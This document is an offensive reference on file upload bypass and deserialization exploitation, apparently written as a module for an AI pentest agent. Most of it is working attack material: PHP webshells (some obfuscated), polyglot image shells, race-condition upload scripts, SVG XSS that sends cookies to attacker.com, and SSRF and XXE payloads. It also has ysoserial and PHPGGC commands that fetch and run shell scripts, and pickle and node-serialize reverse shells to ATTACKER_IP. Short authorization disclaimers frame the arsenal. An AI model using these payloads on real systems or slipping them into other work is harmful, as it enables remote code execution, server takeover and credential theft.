# File Upload & Deserialization Complete Arsenal

> Comprehensive offensive reference for file upload bypass and deserialization exploitation.
> For authorized penetration testing and security research only.

---

## 1. Extension Bypass Techniques

### 1.1 PHP Alternative Extensions

When `.php` is blacklisted, try every alternative the server may execute:

```
.php3
.php4
.php5
.php7
.php8
.pht
.phtml
.phar
.phps
.pgif
.shtml
.inc
.module
.cgi
```

**Quick fuzzing with Burp Intruder or ffuf:**

```bash
# Generate extension wordlist
cat <<'EOF' > php_exts.txt
php
php3
php4
php5
php7
php8
pht
phtml
phar
phps
pgif
shtml
inc
EOF

# Fuzz with ffuf
ffuf -u "https://target.com/upload" \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary\r\nContent-Disposition: form-data; name="file"; filename="shell.FUZZ"\r\nContent-Type: image/png\r\n\r\n<?php system($_GET["c"]); ?>\r\n------Boundary--' \
  -w php_exts.txt -mc 200
```

### 1.2 ASP/ASPX Alternative Extensions

```
.asp
.aspx
.ashx
.asmx
.ascx
.config    (web.config with embedded code)
.cshtml
.vbhtml
.cer
.asa
.cdx
```

### 1.3 JSP Alternative Extensions

```
.jsp
.jspx
.jsw
.jsv
.jspf
.war       (deploy entire WAR)
.xml       (JNDI via web.xml)
```

---

## 2. Double Extension & Null Byte Tricks

### 2.1 Double Extension

Exploit parsers that check only the last or only the first extension:

```
shell.php.jpg          # Apache may execute as PHP if AddHandler is set
shell.php.png
shell.php.txt
shell.jpg.php          # Nginx misconfiguration
shell.php%00.jpg       # Null byte (legacy PHP < 5.3.4, old Java)
shell.php;.jpg         # IIS semicolon bypass
shell.php:jpg          # NTFS Alternate Data Stream
shell.php/.jpg         # Path confusion
```

### 2.2 Null Byte Injection (Legacy)

Works on PHP < 5.3.4 and older Java/Python frameworks:

```
shell.php%00.jpg
shell.php\x00.jpg
shell.php\0.jpg
```

**Burp request example:**

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Bound

------Bound
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
------Bound--
```

### 2.3 Case Manipulation

```
shell.pHp
shell.PHP
shell.Php5
shell.pHtMl
shell.PhAr
```

### 2.4 Trailing Characters / Whitespace

```
shell.php.            # Trailing dot (Windows)
shell.php%20          # Trailing space
shell.php...          # Multiple dots
shell.php%0a          # Newline
shell.php\n           # Literal newline in multipart
shell.php::$DATA      # NTFS ADS (IIS/Windows)
```

---

## 3. MIME Type Bypass

### 3.1 Common Allowed MIME Types

Replace `Content-Type` in the multipart upload:

```
image/jpeg
image/png
image/gif
image/svg+xml
image/webp
application/pdf
text/plain
application/octet-stream
```

**Burp example — PHP shell with image MIME:**

```http
------Bound
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php echo shell_exec($_GET['c']); ?>
------Bound--
```

### 3.2 Automated MIME Fuzzing

```bash
# Use curl to test MIME types
for mime in "image/jpeg" "image/png" "image/gif" "application/octet-stream" "text/plain"; do
  curl -s -o /dev/null -w "%{http_code} $mime\n" \
    -F "file=@shell.php;type=$mime" \
    https://target.com/upload
done
```

---

## 4. Magic Bytes Injection

Bypass `file`/`finfo` checks by prepending real file signatures before PHP code.

### 4.1 GIF Magic Bytes

```bash
# Minimal GIF header + PHP
printf 'GIF89a;<?php system($_GET["c"]); ?>' > shell.gif.php
```

### 4.2 JPEG Magic Bytes

```bash
# JPEG header (FFD8FFE0) + PHP
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00<?php system($_GET["c"]); ?>' > shell.jpg.php
```

### 4.3 PNG Magic Bytes

```bash
# PNG 8-byte signature + PHP in IDAT-like chunk
printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > shell.png.php
```

### 4.4 BMP Magic Bytes

```bash
printf 'BM<?php system($_GET["c"]); ?>' > shell.bmp.php
```

### 4.5 PDF Magic Bytes

```bash
printf '%%PDF-1.4\n<?php system($_GET["c"]); ?>' > shell.pdf.php
```

### 4.6 Verify Magic Bytes

```bash
file shell.gif.php
# Output: GIF image data, version 89a ...
```

---

## 5. .htaccess Upload

If you can upload to the same directory the server serves from:

### 5.1 Make .jpg Execute as PHP

```apache
# .htaccess content
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg
```

Upload this `.htaccess`, then upload a webshell as `shell.jpg`.

### 5.2 Make Any Extension Execute PHP

```apache
AddType application/x-httpd-php .pwn
```

### 5.3 PHP via SetHandler

```apache
<FilesMatch "shell\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

### 5.4 Enable CGI Execution

```apache
Options +ExecCGI
AddHandler cgi-script .py .pl .sh
```

### 5.5 .htaccess + .user.ini Combo (PHP-FPM)

If using PHP-FPM, upload `.user.ini` instead:

```ini
; .user.ini
auto_prepend_file=shell.jpg
```

Then upload `shell.jpg` containing PHP code — every PHP file in that directory will auto-include it.

---

## 6. Polyglot Files

Files valid as multiple formats simultaneously.

### 6.1 JPEG/PHP Polyglot

```bash
# Insert PHP into JPEG EXIF comment
exiftool -Comment='<?php system($_GET["c"]); ?>' legit.jpg
cp legit.jpg shell.php.jpg
```

### 6.2 GIF/PHP Polyglot

```bash
# Create valid GIF that is also valid PHP
python3 -c "
import struct
gif = b'GIF89a'                    # GIF header
gif += struct.pack('<HH', 1, 1)    # 1x1 pixel
gif += b'\x00\x00\x00'             # GCT info
gif += b'\x3b'                     # GIF trailer
gif += b'<?php system(\$_GET[\"c\"]); ?>'
with open('polyglot.gif', 'wb') as f:
    f.write(gif)
"
```

### 6.3 PNG/PHP Polyglot with IDAT Injection

```bash
# Use the php_embed tool or manual approach
# This creates a PNG that survives re-encoding and contains PHP in IDAT
python3 -c "
import zlib, struct
def make_chunk(ctype, data):
    chunk = ctype + data
    return struct.pack('>I', len(data)) + chunk + struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)

sig = b'\x89PNG\r\n\x1a\n'
ihdr = make_chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
# PHP payload inside IDAT
payload = b'<?php system(\$_GET[\"c\"]); ?>'
raw = b'\x00' + b'\xff\x00\x00' + payload  # filter byte + row
compressed = zlib.compress(raw)
idat = make_chunk(b'IDAT', compressed)
iend = make_chunk(b'IEND', b'')

with open('polyglot.png', 'wb') as f:
    f.write(sig + ihdr + idat + iend)
"
```

### 6.4 PDF/PHP Polyglot

```bash
cat <<'EOF' > polyglot.pdf.php
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
<?php system($_GET['c']); ?>
EOF
```

---

## 7. Image Webshell

### 7.1 Minimal PHP Webshell Embedded in Image

```bash
# Using exiftool to embed in EXIF
exiftool -DocumentName='<?php system($_GET["c"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### 7.2 Webshell in PNG tEXt Chunk

```bash
python3 -c "
import struct, zlib

sig = b'\x89PNG\r\n\x1a\n'
# Minimal IHDR
ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)

# tEXt chunk with PHP
keyword = b'Comment\x00'
text = b'<?php system(\$_GET[\"c\"]); ?>'
text_data = keyword + text
text_crc = zlib.crc32(b'tEXt' + text_data) & 0xffffffff
text_chunk = struct.pack('>I', len(text_data)) + b'tEXt' + text_data + struct.pack('>I', text_crc)

# IDAT
raw = b'\x00\x00\x00\x00'
compressed = zlib.compress(raw)
idat_crc = zlib.crc32(b'IDAT' + compressed) & 0xffffffff
idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)

# IEND
iend_crc = zlib.crc32(b'IEND') & 0xffffffff
iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)

with open('webshell.png', 'wb') as f:
    f.write(sig + ihdr + text_chunk + idat + iend)
"
```

### 7.3 Minimal PHP Webshells

```php
<?php system($_GET['c']); ?>
<?=`$_GET[c]`?>
<?php passthru($_REQUEST['c']); ?>
<?php echo shell_exec($_POST['c']); ?>
<?php eval($_POST['c']); ?>
<?php @eval(base64_decode($_POST['c'])); ?>
```

---

## 8. SVG XSS

### 8.1 Basic SVG XSS

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <circle r="50"/>
</svg>
```

### 8.2 SVG with Embedded JavaScript

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    fetch('https://attacker.com/steal?c='+document.cookie);
  </script>
  <text x="10" y="20">SVG XSS</text>
</svg>
```

### 8.3 SVG XSS via `<foreignObject>`

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="200" height="200">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="javascript:alert(1)"></iframe>
    </body>
  </foreignObject>
</svg>
```

### 8.4 SVG XSS via `<use>` and External Reference

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==#x"/>
</svg>
```

### 8.5 SVG SSRF via `<image>`

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="200" height="200"/>
</svg>
```

### 8.6 SVG XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

---

## 9. Race Condition Upload

### 9.1 Concept

Upload a file, and access it before the server deletes/moves/sanitizes it.

### 9.2 Turbo Intruder Script (Burp)

```python
# Turbo Intruder — race the upload + access
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    # Upload request
    upload = '''POST /upload HTTP/1.1
Host: {host}
Content-Type: multipart/form-data; boundary=----Bound

------Bound
Content-Disposition: form-data; name="file"; filename="race.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
------Bound--'''.format(host=target.baseInput.split('/')[2])

    # Access request
    access = '''GET /uploads/race.php?c=id HTTP/1.1
Host: {host}

'''.format(host=target.baseInput.split('/')[2])

    for i in range(100):
        engine.queue(upload, gate='race')
        engine.queue(access, gate='race')

    engine.openGate('race')

def handleResponse(req, interesting):
    if 'uid=' in req.response:
        table.add(req)
```

### 9.3 Race Condition with curl + GNU Parallel

```bash
# Terminal 1 — upload repeatedly
while true; do
  curl -s -X POST -F "file=@shell.php;type=image/jpeg" \
    https://target.com/upload
done

# Terminal 2 — try accessing it
while true; do
  resp=$(curl -s "https://target.com/uploads/shell.php?c=id")
  if echo "$resp" | grep -q "uid="; then
    echo "[+] Race won: $resp"
    break
  fi
done
```

### 9.4 Python Race Script

```python
import threading, requests

url_upload = "https://target.com/upload"
url_shell = "https://target.com/uploads/race.php?c=id"

def upload():
    files = {'file': ('race.php', '<?php system($_GET["c"]); ?>', 'image/jpeg')}
    requests.post(url_upload, files=files)

def access():
    r = requests.get(url_shell)
    if "uid=" in r.text:
        print(f"[+] HIT: {r.text.strip()}")

for _ in range(200):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

---

## 10. PHP Deserialization

### 10.1 Vulnerable Code Pattern

```php
// Dangerous: unserialize() on user input
$data = unserialize($_COOKIE['data']);
$data = unserialize(base64_decode($_POST['obj']));
```

### 10.2 Basic Exploit Class

```php
<?php
class Exploit {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}

$obj = new Exploit();
$obj->cmd = "id";
echo serialize($obj);
// O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}
echo "\n";
echo urlencode(serialize($obj));
?>
```

### 10.3 Magic Methods to Target

| Method | Trigger |
|--------|---------|
| `__destruct()` | Object destroyed |
| `__wakeup()` | `unserialize()` called |
| `__toString()` | Object used as string |
| `__call()` | Inaccessible method called |
| `__get()` | Inaccessible property read |
| `__set()` | Inaccessible property written |
| `__invoke()` | Object used as function |

### 10.4 Phar Deserialization (No `unserialize()` Needed)

If you can upload a `.phar` and trigger a file operation on it:

```php
<?php
// Generate malicious phar
class Exploit {
    public $cmd = "id";
    function __destruct() { system($this->cmd); }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->stopBuffering();
?>
```

**Trigger with any file function:**

```php
file_exists('phar://uploads/exploit.phar');
file_get_contents('phar://uploads/exploit.phar/test.txt');
is_file('phar://uploads/exploit.phar');
stat('phar://uploads/exploit.phar');
getimagesize('phar://uploads/exploit.phar');
// Many more: fopen, copy, rename, unlink, opendir, etc.
```

**Bypass extension filters — rename phar to .jpg/.png/.gif:**

```bash
cp exploit.phar exploit.jpg
# Trigger: file_exists('phar://uploads/exploit.jpg')
```

### 10.5 PHPGGC (PHP Generic Gadget Chains)

```bash
# Install
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# List available chains
./phpggc -l

# Common chains:
# Laravel/RCE1-17, Symfony/RCE1-10, Monolog/RCE1-7,
# Guzzle/RCE1, WordPress/RCE1-2, Doctrine/RCE1-2,
# Slim/RCE1, ThinkPHP/RCE1-2, Yii/RCE1, CakePHP/RCE1

# Generate Laravel RCE payload
./phpggc Laravel/RCE1 system id

# Base64 encoded
./phpggc -b Laravel/RCE1 system id

# URL encoded
./phpggc -u Laravel/RCE1 system id

# As Phar file
./phpggc -p phar -o exploit.phar Monolog/RCE1 system id

# Phar disguised as JPEG
./phpggc -p phar -pp shell.jpg -o exploit.jpg Monolog/RCE1 system id

# Fast destruct (bypass __wakeup check)
./phpggc -f Laravel/RCE1 system id

# Ascii strings only (bypass WAF)
./phpggc -a Symfony/RCE4 system id

# Wrapper for serialized + base64
./phpggc -b -f Monolog/RCE1 system "curl attacker.com/shell.sh|bash"
```

### 10.6 Common Framework Gadget Chains

```bash
# Symfony
./phpggc Symfony/RCE4 system "id"

# WordPress (with Guzzle)
./phpggc Guzzle/RCE1 system "id"

# Magento / Laminas
./phpggc Laminas/RCE1 system "id"

# Doctrine
./phpggc Doctrine/RCE2 system "id"

# Monolog (extremely common — used by Laravel, Symfony, etc.)
./phpggc Monolog/RCE1 system "id"
./phpggc Monolog/RCE2 system "id"
./phpggc Monolog/RCE7 system "id"

# ThinkPHP
./phpggc ThinkPHP/RCE1 system "id"
```

---

## 11. Java Deserialization (ysoserial)

### 11.1 Install & Basic Usage

```bash
# Download
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# List payloads
java -jar ysoserial-all.jar --help

# Generate payload
java -jar ysoserial-all.jar CommonsCollections1 "id" > payload.bin

# Base64 output
java -jar ysoserial-all.jar CommonsCollections1 "id" | base64 -w0
```

### 11.2 Common Gadget Chains

```bash
# Apache Commons Collections (most common)
java -jar ysoserial-all.jar CommonsCollections1 "curl attacker.com/shell.sh|bash"
java -jar ysoserial-all.jar CommonsCollections3 "curl attacker.com/shell.sh|bash"
java -jar ysoserial-all.jar CommonsCollections5 "ping -c1 attacker.com"
java -jar ysoserial-all.jar CommonsCollections6 "wget http://attacker.com/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell"
java -jar ysoserial-all.jar CommonsCollections7 "id"

# Spring Framework
java -jar ysoserial-all.jar Spring1 "touch /tmp/pwned"
java -jar ysoserial-all.jar Spring2 "touch /tmp/pwned"

# Hibernate
java -jar ysoserial-all.jar Hibernate1 "id"

# ROME (RSS library)
java -jar ysoserial-all.jar ROME "id"

# BeanShell
java -jar ysoserial-all.jar BeanShell1 "id"

# Groovy
java -jar ysoserial-all.jar Groovy1 "id"

# JBossInterceptors / Weld (JBoss/WildFly)
java -jar ysoserial-all.jar JBossInterceptors1 "id"

# URLDNS (detection only — no RCE, triggers DNS lookup)
java -jar ysoserial-all.jar URLDNS "http://attacker.burpcollaborator.net"
```

### 11.3 Detection Signatures

Look for these in traffic/cookies/parameters:

```
# Java serialized object magic bytes
AC ED 00 05   (hex, raw binary)
rO0AB         (base64-encoded prefix)

# Common locations
- Cookies (e.g., JSESSIONID alternatives, rememberMe in Apache Shiro)
- POST parameters
- HTTP headers (X-*, custom)
- ViewState (.NET but sometimes Java)
- JMX / RMI endpoints
```

### 11.4 ysoserial.net (.NET)

```bash
# .NET deserialization
git clone https://github.com/pwntester/ysoserial.net.git

# Generate payload
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c whoami > C:\\temp\\out.txt"

# Common .NET gadgets
# TypeConfuseDelegate, WindowsIdentity, TextFormattingRunProperties,
# PSObject, ActivitySurrogateSelector, ObjectDataProvider
```

### 11.5 Apache Shiro Deserialization (CVE-2016-4437)

```bash
# Default key: kPH+bIxk5D2deZiIxcaaaA==
# Shiro rememberMe cookie is AES-CBC encrypted then base64'd

python3 shiro_exploit.py -u https://target.com -k kPH+bIxk5D2deZiIxcaaaA== \
  -g CommonsCollections2 -c "id"

# Or manually:
# 1. Generate ysoserial payload
java -jar ysoserial-all.jar CommonsBeanutils1 "id" > payload.bin
# 2. AES-CBC encrypt with known key
# 3. Base64 encode
# 4. Set as rememberMe cookie
```

---

## 12. Python Pickle Deserialization

### 12.1 Basic RCE Payload

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```

### 12.2 Reverse Shell via Pickle

```python
import pickle
import base64
import os

class RevShell:
    def __reduce__(self):
        cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = pickle.dumps(RevShell())
print(base64.b64encode(payload).decode())
```

### 12.3 Pickle via `__reduce__` + `exec`

```python
import pickle, base64

class P:
    def __reduce__(self):
        return (exec, ("import os; os.system('id')",))

print(base64.b64encode(pickle.dumps(P())).decode())
```

### 12.4 Detection — Where Pickle Appears

```python
# Vulnerable patterns in code:
pickle.loads(user_input)
pickle.load(open(user_controlled_path, 'rb'))
cPickle.loads(data)
shelve.open(user_path)
yaml.load(data)                   # PyYAML < 6.0 uses pickle internally
pandas.read_pickle(user_input)
numpy.load(user_file, allow_pickle=True)
joblib.load(user_file)
torch.load(user_file)             # PyTorch model loading
```

### 12.5 Bypass Restricted Unpickler

```python
# If they restrict __reduce__, try __setstate__
class Exploit:
    def __setstate__(self, state):
        import os; os.system(state)

# Or craft raw pickle opcodes
import pickletools
# Use cos\nsystem\n(S'id'\ntR. for manual opcode injection
payload = b"cos\nsystem\n(S'id'\ntR."
```

---

## 13. Node.js Deserialization

### 13.1 node-serialize RCE

The `node-serialize` package is vulnerable to RCE via IIFE in serialized data:

```javascript
// Payload — Immediately Invoked Function Expression
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){require('http').request({host:'ATTACKER_IP',port:8080,path:'/'+o}).end()})}()"}
```

### 13.2 Reverse Shell Payload

```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')}()"}
```

### 13.3 Base64-Encoded node-serialize

```bash
# Generate base64 payload
echo -n '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").execSync(\"id\")}()"}' | base64
```

### 13.4 Detection Signatures

```
# Look for:
node-serialize
serialize
unserialize
funcster
cryo
js-yaml (< 3.13.1 with !!js/function)
```

### 13.5 js-yaml Deserialization (< 3.13.1)

```yaml
# Payload in YAML:
"name": !!js/function >
  function() {
    return require('child_process').execSync('id').toString();
  }
```

---

## 14. .NET Deserialization

### 14.1 ViewState Deserialization

```bash
# If MAC validation is disabled or key is known:
ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c "cmd /c whoami"

# Convert to ViewState format
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -e JABjAGwAaQBlAG4A..." \
  --validationalg="SHA1" \
  --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" \
  --generator="B97B4E27" \
  --path="/app/page.aspx"
```

### 14.2 BinaryFormatter / JSON.NET

```bash
# BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"

# Json.Net
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"

# JSON.NET gadget (manual)
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList",
    "$values": ["cmd","/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

### 14.3 DataContractSerializer

```bash
ysoserial.exe -g DataSet -f DataContractSerializer -c "cmd /c whoami"
```

### 14.4 XmlSerializer Abuse

```xml
<!-- If type is user-controlled -->
<root type="System.Windows.Data.ObjectDataProvider">
  <ObjectInstance type="System.Diagnostics.Process">
    <StartInfo>
      <FileName>cmd.exe</FileName>
      <Arguments>/c whoami</Arguments>
    </StartInfo>
  </ObjectInstance>
  <MethodName>Start</MethodName>
</root>
```

### 14.5 Detection Signatures

```
# .NET serialized magic bytes / patterns:
AAEAAAD/////   (base64 BinaryFormatter)
FF 01 00 00 00 (hex BinaryFormatter)
__type          (JSON.NET TypeNameHandling)
$type           (JSON.NET)
TypeNameHandling != None
ObjectStateFormatter
LosFormatter
ViewState
```

---

## 15. Advanced Upload Bypass Strategies

### 15.1 Content-Length Manipulation

```http
# Zero content-length with chunked transfer
POST /upload HTTP/1.1
Content-Length: 0
Transfer-Encoding: chunked

a
shell.php
0
```

### 15.2 Boundary Manipulation

```http
# Unusual boundary to confuse parsers
Content-Type: multipart/form-data; boundary=--AAAA; boundary=--BBBB
```

### 15.3 Filename Encoding Tricks

```
# Unicode normalization bypass
shell.p\u0068p           # Unicode 'h'
shell.ph%70              # URL-encoded 'p'
shell.php%E2%80%8B       # Zero-width space appended
shell.phphpp             # Extra chars if server strips 'php'
```

### 15.4 Content-Disposition Tricks

```http
# Duplicate filename — parser may take first or second
Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"

# Quoted vs unquoted
Content-Disposition: form-data; name="file"; filename=shell.php

# Filename* (RFC 5987)
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
```

### 15.5 Path Traversal in Filename

```http
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Disposition: form-data; name="file"; filename="....//....//shell.php"
Content-Disposition: form-data; name="file"; filename="%2e%2e%2fshell.php"
```

### 15.6 Upload via ZIP/TAR Extraction

```bash
# Create zip with path traversal
mkdir -p "../../var/www/html/"
cp shell.php "../../var/www/html/"
zip -r exploit.zip "../../var/www/html/shell.php"

# Symlink attack via tar
ln -s /etc/passwd link
tar cf exploit.tar link

# Zip slip
python3 -c "
import zipfile
z = zipfile.ZipFile('zipslip.zip', 'w')
z.write('shell.php', '../../../var/www/html/shell.php')
z.close()
"
```

---

## 16. Upload Detection & WAF Bypass

### 16.1 PHP Short Tags & Alternatives

```php
<?php system('id'); ?>                   # Standard
<?=`id`?>                                # Short echo + backtick
<? system('id'); ?>                      # Short open (if enabled)
<% system('id'); %>                      # ASP tags (if enabled)
<script language="php">system('id');</script>  # Script tag (PHP < 7)
```

### 16.2 Obfuscated PHP Webshell

```php
<?php
$f = 'sys'.'tem';
$f($_GET['c']);
?>

<?php
$a = str_rot13('flfgrz');  // system
$a($_GET['c']);
?>

<?php
$b = base64_decode('c3lzdGVt');  // system
$b($_GET['c']);
?>

<?php
(new ReflectionFunction('system'))->invoke($_GET['c']);
?>

<?php
call_user_func('system', $_GET['c']);
?>

<?php
$x = 'assert';
$x($_POST['c']);
?>

<?php
preg_replace('/.*/e', 'system("id")', '');  // PHP < 7
?>

<?php array_map('system', [$_GET['c']]); ?>

<?php $a=$_GET['a'];$$a=$_GET['b'];system($$a); ?>
```

### 16.3 Size-Restricted Shells

```php
<?=`$_GET[c]`?>                          # 19 bytes
<?=`{$_GET[c]}`?>                        # 21 bytes
<?php `$_GET[c]`;                        # 22 bytes
```

---

## 17. Methodology & Checklists

### 17.1 File Upload Testing Checklist

1. **Map the upload endpoint** — identify allowed types, size limits, naming
2. **Test extension bypass** — try all alternative extensions for the server language
3. **Test double extensions** — `shell.php.jpg`, `shell.jpg.php`
4. **Test null byte** — `shell.php%00.jpg` (legacy systems)
5. **Test case variation** — `shell.PHP`, `shell.pHp`
6. **Test MIME type** — change `Content-Type` to allowed types
7. **Test magic bytes** — prepend valid file signatures
8. **Test .htaccess upload** — attempt to upload config files
9. **Test .user.ini upload** — `auto_prepend_file` technique
10. **Test polyglot files** — valid image + valid code
11. **Test SVG upload** — XSS / SSRF / XXE via SVG
12. **Test race condition** — access file before sanitization
13. **Test path traversal** — `../` in filename
14. **Test zip/tar upload** — zip slip, symlink attacks
15. **Test Content-Disposition tricks** — duplicate filenames, encoding
16. **Test filename length** — very long filenames may truncate extensions
17. **Test special characters** — semicolons, colons, pipes in filename
18. **Test upload to different path** — manipulate upload directory parameter
19. **Test overwrite existing files** — replace `.htaccess`, `web.config`
20. **Test image reprocessing bypass** — survive GD/ImageMagick resampling

### 17.2 Deserialization Testing Checklist

1. **Identify serialized data** — cookies, hidden fields, API params, message queues
2. **Identify format** — Java (AC ED / rO0AB), .NET (AAEAAAD), PHP (O:), Python (pickle), JSON
3. **Identify libraries** — check dependencies for known gadget chains
4. **Test URLDNS first** — safe detection payload for Java
5. **Enumerate gadget chains** — use ysoserial / PHPGGC / ysoserial.net
6. **Test blind execution** — DNS/HTTP callback to confirm
7. **Test phar deserialization** — upload phar as image, trigger via file functions
8. **Check for custom classes** — source code review for `__destruct`, `__wakeup`, `readObject`
9. **Check for type juggling** — manipulate serialized types
10. **Test with Burp Java Deserialization Scanner** extension

### 17.3 Tools Reference

| Tool | Purpose |
|------|---------|
| `PHPGGC` | PHP gadget chain generator |
| `ysoserial` | Java gadget chain generator |
| `ysoserial.net` | .NET gadget chain generator |
| `marshalsec` | Java unmarshalling exploit toolkit |
| `GadgetInspector` | Automated Java gadget chain discovery |
| `Burp Upload Scanner` | Automated upload bypass testing |
| `fuxploider` | Automated file upload vulnerability scanner |
| `exiftool` | Metadata / EXIF payload injection |
| `Burp Java Deserialization Scanner` | Detect Java deser in traffic |
| `SerializationDumper` | Decode Java serialized objects |
| `freddy` | Burp extension for deserialization detection |

---

## 18. Quick Reference — One-Liners

```bash
# GIF webshell
echo -e 'GIF89a;<?php system($_GET["c"]); ?>' > shell.gif.php

# JPEG webshell via exiftool
exiftool -Comment='<?php system($_GET["c"]); ?>' clean.jpg && mv clean.jpg shell.php.jpg

# PHP Phar generation
php -d phar.readonly=0 -r '$p=new Phar("x.phar");$p->startBuffering();$p->addFromString("t","t");$p->setStub("<?php __HALT_COMPILER();?>");class E{public $x="id";function __destruct(){system($this->x);}}$p->setMetadata(new E());$p->stopBuffering();'

# PHPGGC Laravel payload
phpggc -b -f Laravel/RCE1 system "id"

# ysoserial CommonsCollections
java -jar ysoserial-all.jar CommonsCollections6 "curl attacker.com/x" | base64 -w0

# Python pickle RCE
python3 -c "import pickle,base64,os;print(base64.b64encode(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})())));"

# Node.js serialize RCE
echo '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").execSync(\"id\")}()"}' | base64

# .NET BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" | base64
```

---

> **Usage**: This is a reference module for the Bxploit AI pentest agent. All techniques require explicit authorization from the target owner. Unauthorized access is illegal.
